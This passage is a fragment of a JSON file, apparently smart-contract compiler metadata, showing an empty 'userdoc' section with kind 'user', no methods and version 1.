  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}